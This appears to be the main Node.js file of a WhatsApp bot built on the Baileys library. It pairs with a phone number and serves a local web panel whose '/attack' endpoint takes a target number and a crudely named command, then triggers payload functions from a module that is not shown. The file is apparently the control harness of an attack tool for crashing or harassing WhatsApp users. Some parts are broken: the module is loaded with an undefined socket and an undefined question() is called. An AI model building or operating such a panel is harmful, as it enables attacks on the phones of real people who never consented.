require('dotenv').config();
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const pino = require('pino');
const chalk = require('chalk');
const path = require('path');
const axios = require('axios');
const { Boom } = require('@hapi/boom');

// Web Panel Setup
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

let rafatharcode; // Global socket

// Load Commands
require('./usamaX')(rafatharcode);

// WhatsApp Connection
async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    rafatharcode = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["UsamaBot", "Chrome", "120.0.0.1"],
    });

    rafatharcode.ev.on('creds.update', saveCreds);

    // Pairing Code Login
    if (!rafatharcode.authState.creds.registered) {
        const phoneNumber = process.env.PHONE_NUMBER || await question('Enter WhatsApp number (923×××××): ');
        const code = await rafatharcode.requestPairingCode(phoneNumber.trim());
        console.log(chalk.yellow(`Pairing Code: ${code}`));
    }

    // Connection Updates
    rafatharcode.ev.on('connection.update', (update) => {
        if (update.connection === "open") {
            console.log(chalk.green("✅ Connected to WhatsApp!"));
            startWebPanel();
        }
    });
}

// Start Web Panel
function startWebPanel() {
    app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public/index.html')));
    
    app.post('/attack', async (req, res) => {
        const { target, command } = req.body;
        if (command === 'fuckvi') await usamanew(target);
        else if (command === 'fuckinvi') await usamanew2(target);
        res.send("Attack Sent!");
    });

    app.listen(3000, () => console.log(chalk.blue("Web Panel: http://localhost:3000")));
}

connectToWhatsApp();